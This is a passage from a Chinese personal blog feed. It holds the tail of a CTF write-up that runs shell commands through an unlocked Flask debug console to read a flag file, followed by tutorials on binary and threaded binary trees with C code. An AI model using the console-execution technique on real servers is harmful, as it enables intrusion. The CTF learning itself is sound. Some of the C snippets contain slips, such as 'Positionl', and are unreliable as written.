alt="image-20231106153806563"></p><p>进入控制台，可以访问<code>/console</code>或者点击报错调试页面右边的那个黑格子，输入PIN码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106155043435.png" alt="image-20231106155043435"></p><p>登录成功，执行命令。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;app.py\nstatic\ntemplates\nuploads\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;Fffff111114444gggggg\napp\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmed  </span></span><br><span class="line"><span class="string">&gt;&gt;&gt; os.popen(&#x27;</span>cat /Fffff111114444gggggg<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">&#x27;</span>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>得到flag<code>XSCTF&#123;oh_mY_d2bug93r_M0de_!&#125;</code>。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>当时在线下赛时，被这个flask算PIN折磨的几乎崩溃，没有吃透源码被博客坑惨了。而且出题人也玩了一手阴招，并没有按照Python版本的规律出题。导致我思路全对却因为一直采用的是md5加密而无法计算出正确的PIN值。</p><p>其实这题很简单，只要有Flask的debug模式+任意文件读取就可以做。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%94%A8/">Flask调试模式PIN值计算和利用 - 正汰的学习笔记 (hz2016.com)</a></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg" alt="300342"></p>]]></content>
    
    
    <summary type="html">由于目录穿越引起的文件任意读取漏洞导致可以通过计算PIN码的方式来进入控制台</summary>
    
    
    
    <category term="CTF苦痛之路" scheme="http://example.com/categories/CTF%E8%8B%A6%E7%97%9B%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="目录穿越" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
    
    <category term="任意读取" scheme="http://example.com/tags/%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（五）——树：线索二叉树</title>
    <link href="http://example.com/2023/11/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E6%A0%91%EF%BC%9A%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://example.com/2023/11/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E6%A0%91%EF%BC%9A%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2023-11-01T14:36:37.000Z</published>
    <updated>2023-11-01T14:46:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据结构什锦（四）"><a href="#数据结构什锦（四）" class="headerlink" title="数据结构什锦（四）"></a>数据结构什锦（四）</h1><h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>在先前的笔记中，我们讨论了普通的二叉树。但是普通二叉树的非递归遍历依赖于栈和队列的辅助，而这两者占用的空间过大。且在普通二叉树的大部分指针为空指针。例如，一棵有n个节点的二叉树就包含n+1个空指针，会造成储存空间的浪费。</p><p>现在我们来介绍线索二叉树&#x2F;threaded binary tree traversal，这种二叉树的遍历不需要栈或者队列，而是在空指针中储存一些信息称为线索&#x2F;thread来辅助遍历。</p><h3 id="线索二叉树的动机"><a href="#线索二叉树的动机" class="headerlink" title="线索二叉树的动机"></a>线索二叉树的动机</h3><p>容易知道，我们之所以在之前需要用栈或者队列去储存节点，是因为我们需要在遍历完该节点左子树后再遍历其右子树。如果我们把这些信息储存在空指针里，就不需要栈和队列了。那么我们要怎么储存信息呢？</p><p>通常我们会储存节点的前驱&#x2F;后继节点。如果我们处理的是<strong>先序遍历</strong>，那么对于给定的节点，它的左空指针存放该节点的<strong>先序</strong>前驱节点信息，右空指针储存该节点的<strong>先序</strong>后继节点的信息。</p><h3 id="线索二叉树的分类"><a href="#线索二叉树的分类" class="headerlink" title="线索二叉树的分类"></a>线索二叉树的分类</h3><p>我们将是否在左右指针中均存有有用信息还是只在其中一个空指针中存储信息来将线索二叉树进行分类。</p><ul><li>左线索二叉树&#x2F;left threaded binary tree。只在左空指针中存储前驱节点信息。</li><li>右线索二叉树&#x2F;right threaded binary tree。只在右空指针中存储后继节点信息。</li><li>满线索二叉树&#x2F;full threaded binary tree。两个空指针域中都储存信息。</li></ul><p>下面我们默认只讨论满线索二叉树。</p><h3 id="线索二叉树的类型"><a href="#线索二叉树的类型" class="headerlink" title="线索二叉树的类型"></a>线索二叉树的类型</h3><p>基于上面的讨论，我们还能给出线索二叉树的三种表示。</p><ul><li>先序线索二叉树&#x2F;preorder threaded binary tree。左右空指针域分别储存先序遍历序列中前驱&#x2F;后继节点的信息。</li><li>中序线索二叉树&#x2F;inorder threaded binary tree。左右空指针域分别储存中序遍历序列中前驱&#x2F;后继节点的信息。</li><li>后序线索二叉树&#x2F;postorder threaded binary tree。左右空指针域分别储存后序遍历序列中前驱&#x2F;后继节点的信息。</li></ul><p>这三种看起来都差不多，所以接下来我们只讨论中序线索二叉树来展开讨论。</p><h3 id="线索二叉树的结构"><a href="#线索二叉树的结构" class="headerlink" title="线索二叉树的结构"></a>线索二叉树的结构</h3><p>线索二叉树必须要区分清楚线索和常规左右指针，所以我们添加了两个辅助域。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="type">int</span> LTag;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="type">int</span> RTag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>具体的信息整理了如下表格。</p><table><thead><tr><th></th><th>常规二叉树</th><th>线索二叉树</th></tr></thead><tbody><tr><td>如果LTag&#x3D;&#x3D;0</td><td>空</td><td>指向中序序列前驱节点的左线索</td></tr><tr><td>如果LTag&#x3D;&#x3D;1</td><td>指向左孩子的指针</td><td>指向中序序列后继节点的左线索</td></tr><tr><td>如果RTag&#x3D;&#x3D;0</td><td>空</td><td>指向中序序列前驱节点的右线索</td></tr><tr><td>如果RTag&#x3D;&#x3D;1</td><td>指向右孩子的指针</td><td>指向中序序列后继节点的右线索</td></tr></tbody></table><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))3((3))--&gt;6((6))3((3))--&gt;7((7))4((4)).-&gt;8((NULL))4((4)).-&gt;2((2))2((2)).-&gt;1((1))6((6)).-&gt;3((3))6((6)).-&gt;1((1))7((7)).-&gt;3((3))7((7)).-&gt;9((NULL))  </pre></div><p>我们可以注意到线索二叉树的最左边和最右边两个节点的空指针是悬挂的，那么他们指向哪里呢？</p><p>为了方便，我们定义一个特殊节点Dummy。该节点总是存在，即使对于一个空的树他也存在。且Dummy节点的右标识为1，其右孩子节点指向它自己。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span> <span class="title">Dummy</span>=</span>&#123;</span><br><span class="line">    &amp;Dummy,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">-1</span>,<span class="comment">//任何不存在的值</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    &amp;Dummy</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB    left --- LTag:1    left --&gt; 1    LTag:1 --- None    None --- RTag:1    RTag:1 --- right    right .-&gt; right1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))3((3))--&gt;6((6))3((3))--&gt;7((7))4((4)).-&gt;left4((4)).-&gt;2((2))2((2)).-&gt;1((1))6((6)).-&gt;3((3))6((6)).-&gt;1((1))7((7)).-&gt;3((3))7((7)).-&gt;right  </pre></div><h3 id="线索二叉树的操作"><a href="#线索二叉树的操作" class="headerlink" title="线索二叉树的操作"></a>线索二叉树的操作</h3><h4 id="在中序遍历中查找中序后继节点"><a href="#在中序遍历中查找中序后继节点" class="headerlink" title="在中序遍历中查找中序后继节点"></a>在中序遍历中查找中序后继节点</h4><p>假设我们给定的节点是P，要查询该节点的后继节点。如果P没有又子树，就返回P的右孩子指针，此时该指针指向的元素即为后继节点；倘若P存在右子树，就返回指向其右子树最左下的节点的指针。（主要是由于这是中序遍历，先遍历左子树再读取节点。此时该节点右子树的最左下节点是该节点的后继节点）</p><p>代码实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> ThreadedBinaryTreeNode*<span class="title function_">InorderSuccessor</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*P)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">Position</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(P-&gt;RTag==<span class="number">0</span>)<span class="comment">//判断是否存在右子树</span></span><br><span class="line">        <span class="keyword">return</span> P-&gt;right;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Position=P-&gt;right;</span><br><span class="line">        <span class="keyword">while</span> (Position-&gt;LTag==<span class="number">1</span>)<span class="comment">//遍历至节点右子树最左边的元素</span></span><br><span class="line">            Position=Position-&gt;left;</span><br><span class="line">        <span class="keyword">return</span> Positionl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于中序线索二叉树的中序遍历"><a href="#基于中序线索二叉树的中序遍历" class="headerlink" title="基于中序线索二叉树的中序遍历"></a>基于中序线索二叉树的中序遍历</h4><p>我们可以从Dummy节点开始调用<code>InorderSuccessor()</code>来访问每个节点直到回到Dummy节点为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InorderTraversal</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="comment">//root即为Dummy节点，此时调用InorderSuccessor函数传入Dummy节点</span></span><br><span class="line">    <span class="comment">//判断Dummy节点的右子树是否存在，Dummy节点的右子树始终存在且指向自己</span></span><br><span class="line">    <span class="comment">//于是这里返回的是Dummy节点右子树最左侧的节点，也就是其自身的左子树的最左侧节点</span></span><br><span class="line">    <span class="comment">//然后沿着树一路北上知道从另一侧重新回到Dummy节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">P</span>=</span> root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        P= InorderSuccessor(P);</span><br><span class="line">        <span class="keyword">if</span>(P==root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,P-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在中序遍历中查找先序后继节点"><a href="#在中序遍历中查找先序后继节点" class="headerlink" title="在中序遍历中查找先序后继节点"></a>在中序遍历中查找先序后继节点</h4><p>策略和查找中序后继节点的方法类似。首先检查给定节点的左子树：若存在左子树，则返回P的左孩子指针；否则，返回右子树包含P的最近节点的右孩子。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> ThreadedBinaryTreeNode*<span class="title function_">PreorderSuccessor</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*P)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">Position</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(P-&gt;LTag==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> P-&gt;left;<span class="comment">//如果左子树存在，返回指向的左孩子。</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Position=P;</span><br><span class="line">        <span class="keyword">while</span> (Position-&gt;RTag==<span class="number">0</span>)<span class="comment">//一直遍历到该节点的右子树最右端</span></span><br><span class="line">            Position=Position-&gt;right;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> Position-&gt;right;<span class="comment">//此时返回的是右子树的最右端节点后继节点，当然，按照的是中序规则。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于中序线索二叉树的先序遍历"><a href="#基于中序线索二叉树的先序遍历" class="headerlink" title="基于中序线索二叉树的先序遍历"></a>基于中序线索二叉树的先序遍历</h4><p>和中序遍历一样，从Dummy节点开始调用<code>PreorderSuccessor()</code>遍历每个节点直到回到Dummy节点为止。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreorderTraversal</span><span class="params">(<span class="keyword">struct</span> ThreadedBinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadedBinaryTreeNode</span>*<span class="title">P</span>=</span>root;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        P= PreorderSuccessor(P);</span><br><span class="line">        <span class="keyword">if</span>(P==root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,P-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>（暂时先写这么多，浅浅了解一下就好……应该吧）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2086464994_p0.jpg" alt="复件 86464994_p0"></p>]]></content>
    
    
    <summary type="html">简要的介绍了下一种特殊的二叉树，线索二叉树。包括其原理、结构、和部分操作。</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="线索二叉树" scheme="http://example.com/tags/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（四）——树：二叉树</title>
    <link href="http://example.com/2023/10/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E6%A0%91%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://example.com/2023/10/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E6%A0%91%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2023-10-25T12:43:38.000Z</published>
    <updated>2023-10-25T13:29:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们来聊聊树，重点讨论了二叉树的性质。</p><hr><h2 id="什么是树"><a href="#什么是树" class="headerlink" title="什么是树"></a>什么是树</h2><p>树是一种类似于链表的数据结构。但是不同于链表、栈、队列等线性结构，树是我们接触到的第一个非线性数据结构。它的每个节点指向的是一批节点，而不是单个节点，也就是一对多的关系。树结构可以用来表示图范畴中具有层次特性的结构。</p><p>在树的ADT中，元素之间的次序不再被强调。如果需要表示有序的信息，考虑采用链表等线性储存结构。</p><h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul><li><strong>树的根&#x2F;root</strong>，指没有双亲的节点。一棵树中至多有一个根节点。</li><li><strong>边&#x2F;edge</strong>，表示的是从双亲到孩子的链接。</li><li><strong>叶子节点&#x2F;leaf</strong>，没有孩子的节点。</li><li><strong>兄弟节点&#x2F;sibling</strong>，相同双亲的孩子节点称为兄弟sibling。</li><li><strong>祖先节点&#x2F;ancestor</strong>，如果存在一条从根节点到节点p的一条路径，且节点q在这条路径上，那么q是p的一个祖先，节点p是q的一个子孙&#x2F;descendant。</li><li><strong>层&#x2F;level</strong>，在指定深度的所有节点的集合称为树的层。根节点所在的层是<strong>第1层</strong>。（但是《数据结构与算法 经典问题解析》上认为根节点所在层是第0层）</li><li><strong>节点的深度&#x2F;depth</strong>，是指根节点到该节点的路径长度。</li><li><strong>节点的高度&#x2F;height</strong>，指该节点到最深节点的路径长度。</li><li><strong>树的深度</strong>，所有节点深度的最大值。</li><li><strong>树的高度</strong>，所有节点高度的最大值。树的高度和深度相等，但节点不一定。</li><li><strong>节点的度</strong>，节点拥有子树的个数称为节点的度。</li><li><strong>树的度</strong>，树中各节点度的最大值。一般我们将树的度为m的树称为<strong>m次树</strong>或者<strong>m叉树</strong>。</li><li><strong>节点的大小&#x2F;size</strong>，是指包括该节点在内的以及它子孙节点的个数。</li><li><strong>斜树&#x2F;skew tree</strong>，如果一棵树除了叶子节点外每一个节点都只有一个孩子节点，就称这棵树为斜树。如果全部是左孩子节点就是左斜树&#x2F;left skew tree，如果全部是右孩子节点就是右斜树&#x2F;right skew tree。</li><li><strong>森林</strong>，几棵不相关的树的集合称为森林。</li></ul><h2 id="树的性质"><a href="#树的性质" class="headerlink" title="树的性质"></a>树的性质</h2><ol><li>树中所有的节点数等于所有节点的度数加一。</li><li>定义总节点数为n，n<del>i</del>为度数为i的节点，则n&#x3D;n<del>0</del>+n<del>1</del>+n<del>2</del>+…+n<del>m</del>。m为树的度。</li><li>度为m的树中第i层上至多有m^i-1^个节点（i≥1）。比如度为3的树第二层至多有3个节点。</li><li>高度为h的m次数至多有m^h^-1&#x2F;m-1个节点（就是等比数列求和公式）<code>Sn=a1(1-q^n)/(1-q)（q≠1)</code>。</li></ol><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>如果树的度为2，我们就成称这棵树为二叉树。空树也是一棵合法的二叉树，我们将二叉树看做是由两棵互不相交的子树构成，分别称为左子树和右子树。</p><h3 id="特殊的二叉树"><a href="#特殊的二叉树" class="headerlink" title="特殊的二叉树"></a>特殊的二叉树</h3><h4 id="严格二叉树-strict-binary-tree"><a href="#严格二叉树-strict-binary-tree" class="headerlink" title="严格二叉树&#x2F;strict binary tree"></a>严格二叉树&#x2F;strict binary tree</h4><p>一棵树中每个节点要么有两个孩子要么没有孩子，就是严格二叉树。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((4))1((1))--&gt;3((3))2((4))--&gt;4((2))2((4))--&gt;5((5))  </pre></div><h4 id="满二叉树-full-binary-free"><a href="#满二叉树-full-binary-free" class="headerlink" title="满二叉树&#x2F;full binary free"></a>满二叉树&#x2F;full binary free</h4><p>如果一棵树中每个非叶子节点都刚好有两个孩子且所有叶子节点都处于同一层，就是满二叉树，同时也满足严格二叉树的定义。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><h4 id="完全二叉树-complete-binary-tree"><a href="#完全二叉树-complete-binary-tree" class="headerlink" title="完全二叉树&#x2F;complete binary tree"></a>完全二叉树&#x2F;complete binary tree</h4><p>我们先假设一棵树的高度为h，然后从根节点开始依次对节点进行编号（令根节点编号为1）。那么我们可以得到一个从1到n的完全序列（n为树的节点数）。在编号遇到空指针时，我们也应该给空指针进行编号（也就是没有孩子节点的节点）。</p><p>如果一棵二叉树的所有叶子节点的<strong>高度</strong>是h或h-1，并且得到的节点编号序列中没有遗漏任何一个数（即保证编号是一个完全序列），那么这棵二叉树是一个完全二叉树。其特点是叶子节点只可能在最下层和次下层出现，且最下层的叶子节点集中在树的左部。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))  </pre></div><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p>假设二叉树的高度为h，定义根节点的高度为0。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><p>可以推断出以下性质：</p><ul><li>满二叉树的节点个数n为2^h+1^-1。这是因为高度为h的满二叉树共有h+1层。而每一层均充满节点，因此n&#x3D;2^0^+2^1^+2^2^+…+2^h^&#x3D;2^h+1^-1。</li><li>完全二叉树的节点个数介于最小值2^h^和最大值2^h+1^-1之间。</li><li>满二叉树的叶子节点个数为2^h^。</li><li>具有n个节点的完全二叉树中有n+1个空链接（被浪费掉的指针）。</li></ul><h3 id="二叉树的结构"><a href="#二叉树的结构" class="headerlink" title="二叉树的结构"></a>二叉树的结构</h3><p>为了简单起见，我们假设二叉树所携带的数据类型为整形。一种表达二叉树的方法是，每个节点包括一个数据域与两个指针域，分别指向左孩子和右孩子。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的操作"><a href="#二叉树的操作" class="headerlink" title="二叉树的操作"></a>二叉树的操作</h3><h4 id="主要操作"><a href="#主要操作" class="headerlink" title="主要操作"></a>主要操作</h4><ul><li>将一个元素插入到二叉树中</li><li>在二叉树中删除一个元素</li><li>在二叉树中搜索某个元素</li><li>遍历二叉树</li></ul><h4 id="辅助操作"><a href="#辅助操作" class="headerlink" title="辅助操作"></a>辅助操作</h4><ul><li>求二叉树的大小</li><li>求二叉树的高度</li><li>求拥有节点数最多的层次</li><li>求给定的一对节点或更多节点的最早共同祖先&#x2F;Least Common Ancestor，LCA</li></ul><h3 id="二叉树的应用"><a href="#二叉树的应用" class="headerlink" title="二叉树的应用"></a>二叉树的应用</h3><ul><li>在编译器中用的表达树&#x2F;expression tree</li><li>在数据压缩算法中的赫夫曼编码数&#x2F;Huffman coding tree</li><li>二叉搜索树&#x2F;Binary Search Tree，BST。可以实现在很多元素中以平均情况下O(log<del>n</del>)的时间开销进行排序。</li><li>优先队列&#x2F;Priority Queue，PQ。利用PQ可实现在很多元素中最坏情况下以对数时间开销去找出和删除其中的最小值&#x2F;最大值。</li></ul><h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>在链表等线性数据结构中，我们可以比较容易的实现对每一个元素的访问，但是在树结构中，访问元素存在着多种顺序。</p><p>树的遍历与树的搜索很像，因为后者的实现也依赖于前者遍历访问树的每一个元素。但是遍历是以特定的顺序在树中移动，此外，在树的遍历中所有节点都会被访问到；而在树的搜索中，搜索过程将在找到目标节点后终止。</p><h4 id="可能的遍历方案"><a href="#可能的遍历方案" class="headerlink" title="可能的遍历方案"></a>可能的遍历方案</h4><p>树的遍历从根节点开始，在每一个节点都有三个操作步骤，分别用三个字母表示就是：L（遍历左子树）、R（遍历右子树）、D（访问当前节点）。二叉树的遍历很容易用基于这种表示的递归方式来描述，在这种定义下有六种方法：LRD、LDR、DLR、DRL、RDL、RLD。</p><p>其实相对于节点来说，先搜索左边还是右边无关紧要，所以将搜索方法精简为三种：</p><ul><li>先序（DLR）遍历</li><li>中序（LDR）遍历</li><li>后序（LRD）遍历</li><li>层次遍历，灵感来自于图的广度优先搜索算法（BFS），是另外一种遍历方式。</li></ul><p>以下图为例开启后续的讨论。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TB;1((1))--&gt;2((2))1((1))--&gt;3((3))2((2))--&gt;4((4))2((2))--&gt;5((5))3((3))--&gt;6((6))3((3))--&gt;7((7))  </pre></div><h5 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h5><p>先序遍历分为三步：</p><ul><li>访问根节点</li><li>遍历左子树</li><li>遍历右子树</li></ul><p>如此得到的节点访问顺序是：1,2,4,5,3,6,7。</p><p>用递归来实现先序遍历很简单。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">        PreOrder(root-&gt;left);</span><br><span class="line">        PreOrder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不采用递归结构，也可以实现。因为在访问该节点元素之后还要遍历其左右子树，我们需要保存其左右子树的信息之后再去遍历其他树。我们采用栈结构来实现这一点，因为栈结构的LIFO结构特性使得在逆序中可以得到返回的右子树信息。在访问其左子树前，现将该节点压入栈中，然后访问完左子树之后将节点从栈中弹出继续遍历其右子树。重复上述过程直到栈为空。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PreOrderNonRecursive(<span class="keyword">struct</span> BinaryTreeNode*root) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>*<span class="title">S</span>=</span>CreateStack();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> (root)&#123;</span><br><span class="line">            <span class="comment">//处理当前节点</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">            Push(&amp;S,root);</span><br><span class="line">            <span class="comment">//如果左子树存在，就将其压入栈</span></span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(IsEmptyStack(S))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//表示当前节点，左子树处理完毕，下面开始处理右子树</span></span><br><span class="line">        root= Pop(&amp;S);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteStack(&amp;S);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h5><p>在中序遍历中，根节点是在左右子树遍历之间进行访问的。中序遍历定义如下：</p><ul><li>遍历左子树</li><li>访问根节点</li><li>遍历右子树</li></ul><p>如此操作得到的访问顺序是：4,2,5,1,6,3,7。</p><p>递归实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode*root)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root)&#123;</span><br><span class="line">        InOrder(root-&gt;left);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">        InOrder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//和前面的思路基本一样</span></span><br></pre></td></tr></table></figure><p>中序遍历的非递归算法和先序遍历的实现非常相似，唯一的区别就是访问元素的时间发生在了元素出栈时，这时意味着元素的左子树已经处理完毕，实现代码如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">InOrderNonRecursive(<span class="keyword">struct</span> BinaryTreeNode*root) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>*<span 